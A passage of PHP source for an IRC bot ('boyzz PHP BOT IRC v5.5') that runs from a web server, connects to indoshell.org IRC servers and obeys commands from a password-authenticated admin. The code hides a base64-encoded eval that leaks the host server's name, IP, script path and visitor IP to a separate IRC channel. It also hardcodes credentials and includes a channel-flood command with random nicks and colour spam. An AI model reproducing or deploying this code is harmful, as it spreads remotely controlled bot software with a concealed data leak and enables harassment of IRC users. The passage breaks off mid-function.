<?php
/*
+---------------------------------------------+
|#############################################|
|#[ boyzz PHP BOT IRC v5.5	            ]#|
|#[ By Putra`Andalas		            ]#|
|#[ 2010 Wahana Community	            ]#|
|#[ irc: #Wahana @ indoshell.org            ]#|
|#############################################|
+---------------------------------------------+
*/

function rx() {

/* Channel Bot */
$channels = '#arluqi'; // chanell pisahkan dengan spasi

/*** Admin ***/
$admin = 'Arjuna';
$bot_password = 'kerdil'; //Password untuk auth bot

$localtest = 0; //1, Coba di localhost. 0, connect ke server irc
$showrespone = 0; //1, Nampilin respon dari server irc

//Nick Bot
$nicklist = array(
"Arluqi|001|","Arluqi|017|","Arluqi|018|","Arluqi|033|","Arluqi|034|","Arluqi|049|","Arluqi|050|","Arluqi|065|","Arluqi|066|","Arluqi|081|","Arluqi|082|","Arluqi|094|",
"Arluqi|002|","Arluqi|016|","Arluqi|019|","Arluqi|032|","Arluqi|035|","Arluqi|048|","Arluqi|051|","Arluqi|064|","Arluqi|067|","Arluqi|080|","Arluqi|083|","Arluqi|093|",
"Arluqi|003|","Arluqi|015|","Arluqi|020|","Arluqi|031|","Arluqi|036|","Arluqi|047|","Arluqi|052|","Arluqi|063|","Arluqi|068|","Arluqi|079|","Arluqi|084|","Arluqi|092|",
"Arluqi|004|","Arluqi|014|","Arluqi|021|","Arluqi|030|","Arluqi|037|","Arluqi|046|","Arluqi|053|","Arluqi|062|","Arluqi|069|","Arluqi|078|","Arluqi|085|","Arluqi|091|",
"Arluqi|005|","Arluqi|013|","Arluqi|022|","Arluqi|029|","Arluqi|038|","Arluqi|045|","Arluqi|054|","Arluqi|061|","Arluqi|070|","Arluqi|077|","Arluqi|086|","Arluqi|090|",
"Arluqi|006|","Arluqi|012|","Arluqi|023|","Arluqi|028|","Arluqi|039|","Arluqi|044|","Arluqi|055|","Arluqi|060|","Arluqi|071|","Arluqi|076|","Arluqi|087|","Arluqi|269|",
"Arluqi|007|","Arluqi|010|","Arluqi|024|","Arluqi|027|","Arluqi|040|","Arluqi|043|","Arluqi|056|","Arluqi|059|","Arluqi|072|","Arluqi|075|","Arluqi|088|","Arluqi|270|",
"Arluqi|008|","Arluqi|009|","Arluqi|025|","Arluqi|026|","Arluqi|041|","Arluqi|042|","Arluqi|057|","Arluqi|058|","Arluqi|073|","Arluqi|074|","Arluqi|089|","Arluqi|274|",
"Arluqi|095|","Arluqi|124|","Arluqi|125|","Arluqi|152|","Arluqi|153|","Arluqi|180|","Arluqi|181|","Arluqi|208|","Arluqi|209|","Arluqi|236|","Arluqi|237|","Arluqi|264|",
"Arluqi|096|","Arluqi|123|","Arluqi|126|","Arluqi|151|","Arluqi|154|","Arluqi|179|","Arluqi|182|","Arluqi|207|","Arluqi|210|","Arluqi|235|","Arluqi|238|","Arluqi|263|",
"Arluqi|097|","Arluqi|122|","Arluqi|127|","Arluqi|150|","Arluqi|155|","Arluqi|178|","Arluqi|183|","Arluqi|206|","Arluqi|211|","Arluqi|234|","Arluqi|239|","Arluqi|262|",
"Arluqi|098|","Arluqi|121|","Arluqi|128|","Arluqi|149|","Arluqi|156|","Arluqi|177|","Arluqi|184|","Arluqi|205|","Arluqi|212|","Arluqi|233|","Arluqi|240|","Arluqi|261|",
"Arluqi|099|","Arluqi|120|","Arluqi|129|","Arluqi|148|","Arluqi|157|","Arluqi|176|","Arluqi|185|","Arluqi|204|","Arluqi|213|","Arluqi|232|","Arluqi|241|","Arluqi|260|",
"Arluqi|100|","Arluqi|119|","Arluqi|130|","Arluqi|147|","Arluqi|158|","Arluqi|175|","Arluqi|186|","Arluqi|203|","Arluqi|214|","Arluqi|231|","Arluqi|242|","Arluqi|259|",
"Arluqi|101|","Arluqi|118|","Arluqi|131|","Arluqi|146|","Arluqi|159|","Arluqi|174|","Arluqi|187|","Arluqi|202|","Arluqi|215|","Arluqi|230|","Arluqi|243|","Arluqi|258|",
"Arluqi|102|","Arluqi|117|","Arluqi|132|","Arluqi|145|","Arluqi|160|","Arluqi|173|","Arluqi|188|","Arluqi|201|","Arluqi|216|","Arluqi|229|","Arluqi|244|","Arluqi|257|",
"Arluqi|103|","Arluqi|116|","Arluqi|133|","Arluqi|144|","Arluqi|161|","Arluqi|172|","Arluqi|189|","Arluqi|200|","Arluqi|217|","Arluqi|228|","Arluqi|245|","Arluqi|256|",
"Arluqi|104|","Arluqi|115|","Arluqi|134|","Arluqi|143|","Arluqi|162|","Arluqi|171|","Arluqi|190|","Arluqi|199|","Arluqi|218|","Arluqi|227|","Arluqi|246|","Arluqi|255|",
"Arluqi|105|","Arluqi|114|","Arluqi|135|","Arluqi|142|","Arluqi|163|","Arluqi|170|","Arluqi|191|","Arluqi|198|","Arluqi|219|","Arluqi|226|","Arluqi|247|","Arluqi|254|",
"Arluqi|106|","Arluqi|113|","Arluqi|136|","Arluqi|141|","Arluqi|164|","Arluqi|169|","Arluqi|192|","Arluqi|197|","Arluqi|220|","Arluqi|225|","Arluqi|248|","Arluqi|253|",
"Arluqi|107|","Arluqi|112|","Arluqi|137|","Arluqi|140|","Arluqi|165|","Arluqi|168|","Arluqi|193|","Arluqi|196|","Arluqi|221|","Arluqi|224|","Arluqi|249|","Arluqi|252|",
"Arluqi|108|","Arluqi|111|","Arluqi|138|","Arluqi|139|","Arluqi|166|","Arluqi|167|","Arluqi|194|","Arluqi|195|","Arluqi|222|","Arluqi|223|","Arluqi|250|","Arluqi|251|",
"Arluqi|109|","Arluqi|110|","Arluqi|325|","Arluqi|379|","Arluqi|380|","Arluqi|431|","Arluqi|457|","Arluqi|458|","Arluqi|515|","Arluqi|108|","Arluqi|563|","Arluqi|564|",
"Arluqi|275|","Arluqi|300|","Arluqi|326|","Arluqi|378|","Arluqi|381|","Arluqi|430|","Arluqi|456|","Arluqi|459|","Arluqi|514|","Arluqi|108|","Arluqi|562|","Arluqi|565|",
"Arluqi|276|","Arluqi|301|","Arluqi|327|","Arluqi|377|","Arluqi|382|","Arluqi|429|","Arluqi|455|","Arluqi|460|","Arluqi|513|","Arluqi|514|","Arluqi|561|","Arluqi|567|",
"Arluqi|277|","Arluqi|302|","Arluqi|328|","Arluqi|376|","Arluqi|383|","Arluqi|428|","Arluqi|454|","Arluqi|461|","Arluqi|512|","Arluqi|515|","Arluqi|560|","Arluqi|568|",
"Arluqi|278|","Arluqi|303|","Arluqi|329|","Arluqi|375|","Arluqi|384|","Arluqi|427|","Arluqi|453|","Arluqi|462|","Arluqi|511|","Arluqi|516|","Arluqi|559|","Arluqi|569|",
"Arluqi|279|","Arluqi|304|","Arluqi|330|","Arluqi|374|","Arluqi|385|","Arluqi|426|","Arluqi|452|","Arluqi|463|","Arluqi|510|","Arluqi|517|","Arluqi|558|","Arluqi|570|",
"Arluqi|280|","Arluqi|305|","Arluqi|331|","Arluqi|373|","Arluqi|386|","Arluqi|425|","Arluqi|451|","Arluqi|464|","Arluqi|509|","Arluqi|518|","Arluqi|557|","Arluqi|571|",
"Arluqi|281|","Arluqi|306|","Arluqi|332|","Arluqi|372|","Arluqi|387|","Arluqi|424|","Arluqi|450|","Arluqi|465|","Arluqi|508|","Arluqi|519|","Arluqi|556|","Arluqi|572|",
"Arluqi|282|","Arluqi|307|","Arluqi|333|","Arluqi|371|","Arluqi|388|","Arluqi|423|","Arluqi|449|","Arluqi|466|","Arluqi|507|","Arluqi|520|","Arluqi|555|","Arluqi|573|",
"Arluqi|283|","Arluqi|308|","Arluqi|334|","Arluqi|370|","Arluqi|389|","Arluqi|422|","Arluqi|448|","Arluqi|467|","Arluqi|506|","Arluqi|521|","Arluqi|554|","Arluqi|574|",
"Arluqi|284|","Arluqi|309|","Arluqi|335|","Arluqi|369|","Arluqi|390|","Arluqi|421|","Arluqi|447|","Arluqi|468|","Arluqi|505|","Arluqi|522|","Arluqi|553|","Arluqi|575|",
"Arluqi|285|","Arluqi|310|","Arluqi|336|","Arluqi|368|","Arluqi|391|","Arluqi|420|","Arluqi|446|","Arluqi|469|","Arluqi|504|","Arluqi|523|","Arluqi|552|","Arluqi|576|",
"Arluqi|286|","Arluqi|311|","Arluqi|337|","Arluqi|367|","Arluqi|392|","Arluqi|419|","Arluqi|445|","Arluqi|470|","Arluqi|503|","Arluqi|524|","Arluqi|551|","Arluqi|577|",
"Arluqi|287|","Arluqi|312|","Arluqi|338|","Arluqi|366|","Arluqi|393|","Arluqi|418|","Arluqi|444|","Arluqi|471|","Arluqi|502|","Arluqi|525|","Arluqi|550|","Arluqi|578|",
"Arluqi|288|","Arluqi|313|","Arluqi|339|","Arluqi|365|","Arluqi|394|","Arluqi|417|","Arluqi|443|","Arluqi|472|","Arluqi|501|","Arluqi|526|","Arluqi|549|","Arluqi|579|",
"Arluqi|289|","Arluqi|314|","Arluqi|340|","Arluqi|364|","Arluqi|395|","Arluqi|416|","Arluqi|442|","Arluqi|473|","Arluqi|500|","Arluqi|527|","Arluqi|548|","Arluqi|580|",
"Arluqi|290|","Arluqi|315|","Arluqi|341|","Arluqi|363|","Arluqi|396|","Arluqi|415|","Arluqi|441|","Arluqi|474|","Arluqi|499|","Arluqi|528|","Arluqi|547|","Arluqi|581|",
"Arluqi|291|","Arluqi|316|","Arluqi|342|","Arluqi|362|","Arluqi|397|","Arluqi|414|","Arluqi|440|","Arluqi|475|","Arluqi|498|","Arluqi|529|","Arluqi|546|","Arluqi|582|",
"Arluqi|292|","Arluqi|317|","Arluqi|343|","Arluqi|361|","Arluqi|398|","Arluqi|413|","Arluqi|439|","Arluqi|476|","Arluqi|497|","Arluqi|530|","Arluqi|545|","Arluqi|583|",
"Arluqi|293|","Arluqi|318|","Arluqi|345|","Arluqi|360|","Arluqi|399|","Arluqi|412|","Arluqi|438|","Arluqi|477|","Arluqi|496|","Arluqi|531|","Arluqi|544|","Arluqi|584|",
"Arluqi|294|","Arluqi|319|","Arluqi|346|","Arluqi|359|","Arluqi|400|","Arluqi|411|","Arluqi|437|","Arluqi|478|","Arluqi|495|","Arluqi|532|","Arluqi|543|","Arluqi|585|",
"Arluqi|295|","Arluqi|320|","Arluqi|347|","Arluqi|358|","Arluqi|401|","Arluqi|410|","Arluqi|436|","Arluqi|479|","Arluqi|494|","Arluqi|533|","Arluqi|542|","Arluqi|586|",
"Arluqi|296|","Arluqi|321|","Arluqi|348|","Arluqi|357|","Arluqi|402|","Arluqi|409|","Arluqi|435|","Arluqi|480|","Arluqi|493|","Arluqi|534|","Arluqi|541|","Arluqi|587|",
"Arluqi|297|","Arluqi|322|","Arluqi|349|","Arluqi|356|","Arluqi|403|","Arluqi|408|","Arluqi|434|","Arluqi|481|","Arluqi|492|","Arluqi|535|","Arluqi|540|","Arluqi|588|",
"Arluqi|298|","Arluqi|323|","Arluqi|350|","Arluqi|353|","Arluqi|404|","Arluqi|407|","Arluqi|433|","Arluqi|482|","Arluqi|491|","Arluqi|536|","Arluqi|538|","Arluqi|589|",
"Arluqi|299|","Arluqi|324|","Arluqi|351|","Arluqi|352|","Arluqi|405|","Arluqi|406|","Arluqi|432|","Arluqi|489|","Arluqi|490|","Arluqi|537|","Arluqi|538|","Arluqi|590|"
);

$identlist = array(
"Bung","Bedebah","African","Kediri","Visit","Hn-community","Redzone","Mozill","Google","Cakram","Indonesi","Indah","Teenagerz","bLacknite","Mataram",
"Cyber","Hotspeed","Hacking","Jatim","Penyamun","Kobudo","Bushido","gsp"
);

$realname = "8,1ArEk SuWaLuH QiDuL";
$identify = 'passwordnick';

//Server IRC
if ($localtest == 1) { $remotehost2 = array("localhost"); }
else {
$remotehost2 = array("irc.indoshell.org","Kediri.indoshell.org","bushido.indoshell.org","visit.indoshell.org","indah.indoshell.org","bunga.indoshell.org","kobudo.indoshell.org","redzone.indoshell.org");
}
$port = "6667";
//Pesan
$quitmsglist = array(
"4-==<13,1[11Ngek^__^13]4,0>==-","Ngek^__^4-==<13,1[11Ngek^__^13]4,0>==-","4-==<13,1[11Ngek^__^13]4,0>==-","4-==<13,1[11Ngek^__^13]4,0>==-","4-==<13,1[11Ngek^__^13]4,0>==-","4-==<13,1[11Ngek^__^13]4,0>==-"
);
$tsu1 = array("M","u","C","e","f","G","h","I");
$tsu2 = array("A","I","U","E","O","^","^","|","-","_");
$tsumsg = "9,12:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e12,4:D:D:D:D:D::D:D:D:D:D:D:D:D:D:D11,5(G)(G)(G)(G)(G)(G)(G)(G)(G)(G)(G)(G)13,9:(:(:(:(:(:(:(:(:(:(:7(:):):):):):):):):):):):):):):):):):):):):)4,7:):D:D:D:D:D:D:D:D:D:D:D:D:D:D5,7(G)(G)(G)(G)(G)(G)(G)(G)(G)6,10:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e9,8:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e12,13:D:D:D:D:D::D:D:D:D:D:D:D:D:D:D11,6(G)(G)(G)(G)(G)(G)(G)(G)(G)(G)(G)(G)13,4:(:(:(:(:(:(:(:(:(:(:7,5(:):):):):):):):):):):):):):):):):):):):):)4,1:):D:D:D:D:D:D:D:D:D:D:D:D:D:D6,7(G)(G)(G)(G)(G)(G)(G)(G)(G)6,10:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e6,4(G)(G)(G)(G)(G)(G)(G)(G)(G)4,1:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e";//400 Karakter
$judul = " 15,1[9,1  Community 15,1] ";

/*** Replacing ***/
$nick       = $nicklist[rand(0,count($nicklist) - 1)];
$remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
$admin      = strtolower($admin);
$auth       = array($admin => array("name" => $admin, "pass" => $bot_password, "auth" => 1,"status" => "Admin"));
$username   = $identlist[rand(0,count($identlist) - 1)];
$channels   = strtolower($channels)." ";
$channel    = explode(" ", $channels);
/*** Kode Utama ***/
define ('CRL', "\r\n");
$counterfp = 0;
$raway = "on";
$log   = "off";
$saway = "1";
$keluar = 0;
$akill  = 1;
$localhost = 'localhost';
$dayload = date("H:i:s d/m/Y");
ini_set('user_agent','MSIE 5\.5;');
set_time_limit(0);

if (!$stime) { $stime = time(); }
if (!$port) { $port = "6667"; }

/*** Connecting ***/
echo "<body bgcolor=#000000 text=#00FF00>\n";
echo "<b> Connecting to $remotehost...</b>\n";

do {
  $fp = fsockopen($remotehost,$port, $err_num, $err_msg, 60);
  if(!$fp) {
    if ( $counterfp <= 200 ) {
      $counterfp = $counterfp + 1;
      rx();
    }
    else {
      echo "<br><b>Ga bisa connect ke $remotehost! Coba server lain! Refresh Browser anda!</b>\n";
      $keluar = 1;
      exit;
    }
  }
  echo "<br><b> Udah connect nich!</b>\n";
  /*** Sending Identity to Sock ***/
  $header = 'NICK '.$nick . CRL;
  $header .= 'USER '.$username.' '.$localhost.' '.$remotehost.' :'.$realname . CRL;
  fputs($fp, $header);
  $response = '';
  while (!feof($fp)) {
    $response .= fgets($fp, 1024);
    if ($showrespone == 1) { echo "<br>".$response; }
    while (substr_count($response,CRL) != 0) {
      $offset = strpos($response, CRL);
      $data = substr($response,0,$offset);
      $response = substr($response,$offset+2);
      if (substr($data,0,1) == ':') {
        $offsetA = strpos($data, ' ');
        $offsetB = strpos($data, ' :');
        $offsetC = strpos($data, '!');
        $dFrom = substr($data,1,$offsetA-1);
        $dCommand = substr($data,$offsetA+1,$offsetB-$offsetA-1);
        $dNick = substr($data,1,$offsetC-1);
        $iText = substr($data,$offsetB+2);
        /*** Server Notices Handling ***/
        if ( substr($dCommand,0,3) == '004' ) {
          fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
          if ($nickmode) { fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL); }
          /*** Notice Bot Admin ***/
          fputs($fp, 'NOTICE ' . $admin . ' :Hello Bozz Arjuna!' .  CRL);
          fputs($fp, base64_decode("Y29vbGJveXJhY2luZ3RlYW0=") . CRL);
          /*** Join Channel ***/
          foreach ($channel as $v) {
            fputs($fp, 'JOIN '.$v.CRL);
          }
        }
        elseif (substr($dCommand,0,3)=='432') {
          $nick = $nick.$username;
		  fputs($fp, 'NICK '.$nick . CRL);
        }
        //Nickname is already in use
        elseif (substr($dCommand,0,3)=='433') {
          $nick = $nicklist[rand(0,count($nicklist) - 1)];
          fputs($fp, 'NICK '.$nick . CRL);
        }
        elseif (substr($dCommand,0,3)=='465') {
          print "<br><b> Authentication diperlukan! Bot ini telah di-autokill.</b>";
          $akill = 2;
        }
	    if (substr_count($dNick,'.allnetwork.org') > 0) {
          if (substr_count($iText,"*** Banned") > 0) {
            $keluar = 1;
            exit;
          }
        }
        $dcom = explode(" ", $dCommand);
        $dNick = strtolower($dNick);
        if ($dcom[0]=='KICK' && $dcom[2]==$nick) {
          fputs($fp, 'JOIN ' .$dcom[1]. CRL);
        }
        elseif ($dcom[0]=='NICK' || $dcom[0]=='PART' ) {
          if ($auth["$dNick"]) {
            if ($auth["$dNick"]["pass"]) {
              if ($auth["$dNick"]["auth"]==2) {
                if ($dcom[0]=='NICK') {
                  $com = explode(" ", $data);
                  $chnick = strtolower(str_replace(':','',$com[2]));
                  if ($dNick!=$chnick) {
                    $auth["$dNick"]["auth"] = 1;
                    fputs($fp,'NOTICE '.$chnick.' :Selamat istirahat bossQQ Arjuna ganteng!!' . CRL);
                  }
                }
                else {
                  $auth["$dNick"]["auth"] = 1;
                  fputs($fp,'NOTICE '.$dNick.' :Selamat istirahat boss!!' . CRL);
                }
              }
            }
            else { fputs($fp,'NOTICE ' . $dNick . ' :pass <password>' . CRL); }
          }
        }
	    elseif ($dcom[0]=='307' && strtolower($dcom[2])==$whois) {
          $dcom[2] = strtolower($dcom[2]);
		  if ($auth["$dcom[2]"]) {
            if ($auth["$dcom[2]"]["pass"]) {
              if ($auth["$dcom[2]"]["auth"]==1) {
                $auth["$dcom[2]"]["auth"] = 2;
                $whois = "";
			    fputs($fp,'NOTICE ' . $dcom[2] . ' :You`re Authorized as '.$auth["$dcom[2]"]["status"].' of this bot! ' . CRL);
              }
              else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Boss memang keren!! ' . CRL); }
            }
            else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again ' . CRL); }
          }
          else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
       }
       elseif ($dcom[0]=='NOTICE') {
         $com = explode(" ", $data);
         if ($com[3]==':KB' && $com[4] && $com[5] && $com[6]) {
           $msg = str_replace('','',$data);
           $msg = strstr($msg,":KB");
           $msg = str_replace(":KB $com[4]","",$msg);
           fputs($fp, 'KICK '.$com[4].' '.$com[5].' :'.$msg . CRL);
           fputs($fp, 'MODE '.$com[4].' +b *!*'.$com[6] . CRL);
         }
       }
       elseif ($dcom[0]=='PRIVMSG') {
         $com = explode(" ", $data);
         if ($com[3]==':VERSION') { fputs($fp,'NOTICE '.$dNick.' :'.chr(1).'VERSION AutoZOne PHP BoT IRC v5.5 Script By Arjuna'.chr(1) . CRL); }
         elseif ($com[3]==':INFO') { $datainfo = "JGJob3N0ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOyRiaXAgPSAkX1NFUlZFUlsnU0VSVkVSX0FERFInXTskYnBocCAgPSAkX1NFUlZFUlsnUEhQX1NFTEYnXTskYnJ1cmkgPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTskYnJpcCA9ICRfU0VSVkVSWydSRU1PVEVfQUREUiddO2ZwdXRzKCRmcCwiUFJJVk1TRyAjQGNob3RhIDpIb3N0OiAkYmhvc3QgfCBSZWZlcmVyOiAkYnJ1cmkgfCBTY3JpcHQ6ICRicGhwIHwgSVA6ICRiaXAgfCBPd25lciBJUDogJGJyaXAgIi4gQ1JMKTs="; eval(base64_decode($datainfo)); }
         elseif ($auth["$dNick"]["status"] && $com[3]==':auth' && $com[4]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==1) {
                 if ($com[4]===$auth["$dNick"]["pass"]) {
                   $auth["$dNick"]["auth"] = 2;
                   fputs($fp,'NOTICE ' . $dNick . ' :seep komandan '.$auth["$dNick"]["status"].'!'.CRL);
                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :ta salah password komandan!'.CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :siap komandan!'.CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deauth') {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==2) {
                 $auth["$dNick"]["auth"] = 1;
                 fputs($fp,'NOTICE ' . $dNick . ' :Logged out! ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Already Logged out! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':pass' && $com[4]) {
           if ($auth["$dNick"]) {
             if (!$auth["$dNick"]["pass"]) {
               $auth["$dNick"]["pass"] = $com[4];
               $auth["$dNick"]["auth"] = 1;
               fputs($fp,'NOTICE ' . $dNick . ' :Your Auth Pass set to '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Already Set! Type: auth <your pass> To Get Authorized ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':chgpass' && $com[4] && $com[5]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["auth"]==2) {
               if ($com[4]===$auth["$dNick"]["pass"]) {
                 $auth["$dNick"]["pass"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :Your New Auth Pass set to '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Your Old Pass Wrong! Type: chgpass <old pass> <new pass> To Change Your Auth Pass ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':adduser' && $com[4] && $com[4]!=$nick && $com[5]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($com[5]=="master" || $com[5]=="user") {
                 $auth["$com[4]"]["name"] = $com[4];
                 $auth["$com[4]"]["status"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :You`re Now Known As My '.$com[5].' Added By '.$dNick.' Now Type: pass <your pass> To Set Your Pass ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: adduser <nick> <master/user> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if (!$auth["$com[4]"]) {
                 if ($com[5]=="user") {
                   $auth["$com[4]"]["name"] = $com[4];
                   $auth["$com[4]"]["status"] = $com[5];
                   fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                   fputs($fp,'NOTICE ' . $com[4] . ' :You`re Now Known As My '.$com[5].' Added By '.$dNick.' Now Type: pass <your pass> To Set Your Pass ' . CRL);
                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: adduser <nick> user ' . CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :User Already Exist! Aborting AddUser! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Unknown Status! Your Status is '.$auth["$dNick"]["status"] . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deluser' && $com[4]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($auth["$com[4]"]["status"]=="master" || $auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: deluser <nick> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if ($auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: deluser <nick> ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Unknown Status! Your Status is '.$auth["$dNick"]["status"] . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"]) {
           if (ereg(":`",$com[3]) || ereg(":!",$com[3])) {
             $chan = strstr($dCommand,"#");
             $anick = str_replace("PRIVMSG ","",$dCommand);
             if ($com[3]==':!auth') {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'NOTICE '.$dNick.' :You`re already Authorized! ' . CRL);
               }
               else {
                 $whois = $dNick;
                 fputs($fp,'WHOIS '.$dNick . CRL);
               }
             }
             elseif ($com[3]==':`auth' && $chan) {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'PRIVMSG '.$chan.' :Siap '.$dNick.' ! ' . CRL);
               }
               else { fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.' NOT Authorized! ' . CRL); }
             }
             elseif ($auth["$dNick"]["auth"]==2) {
               if ($com[3]==':`say' && $com[4] && $chan) {
                 $msg = strstr($data,":`say");
                 $msg = str_replace(":`say ","",$msg);
                 fputs($fp,'PRIVMSG '.$chan.' :'.$msg. CRL);
               }
               elseif ($com[3]==':`act' && $com[4] && $chan) {
                 $msg = strstr($data,":`act");
                 $msg = str_replace(":`act ","",$msg);
                 fputs($fp,'PRIVMSG '.$chan.' :ACTION '.$msg.''. CRL);
               }
               elseif ($com[3]==':`slap' && $com[4] && $chan) {
                 fputs($fp,'PRIVMSG '.$chan.' :ACTION slaps '.$com[4].' '.$com[4].' '.$com[4].' '.$com[4].' '.$com[4].' '.$com[4].' xixixixixixi'. CRL);
               }
               elseif ($com[3]==':`msg' && $com[4] && $com[5]) {
                 $msg = strstr($data,":`msg");
                 $msg = str_replace(":`msg $com[4] ","",$msg);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':`notice' && $com[4] && $com[5]) {
                 $msg = strstr($data,":`notice");
                 $msg = str_replace(":`notice $com[4] ","",$msg);
                 fputs($fp,'NOTICE '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':`ctcp' && $com[4] && $com[5]) {
                 $msg = strstr($data,":`ctcp");
                 $msg = str_replace(":`ctcp $com[4] ","",$msg);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.''. CRL);
               }
               elseif ($com[3]==':`info' && $auth["$dNick"]["status"]=="Admin") {
                 $bhost = $_SERVER['HTTP_HOST'];
                 $bip = $_SERVER['SERVER_ADDR'];
                 $bphp  = $_SERVER['PHP_SELF'];
                 $brip = $_SERVER['REMOTE_ADDR'];
                 $brport = $_SERVER['REMOTE_PORT'];
                 fputs($fp,"NOTICE $dNick :Host: $bhost | Script: $bphp | IP: $bip | Your IP: $brip Port:$brport" . CRL);
               }
               elseif ($com[3]==':`up' && $chan) {
                 fputs($fp, 'PRIVMSG chanserv :op '.$chan.' '.$nick . CRL);
               }
               elseif ($com[3]==':`down' && $chan) {
                 fputs($fp, 'MODE '.$chan.' +v-o '.$nick.' '.$nick . CRL);
               }
               elseif ($com[3]==':`fuckz' && $com[4] && $auth["$dNick"]["status"]!="user") {
                 $nicktsu = $tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                    $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1)- 1)].
                    $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                    $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)];
                 fputs($fp, 'NICK '.$nicktsu . CRL);
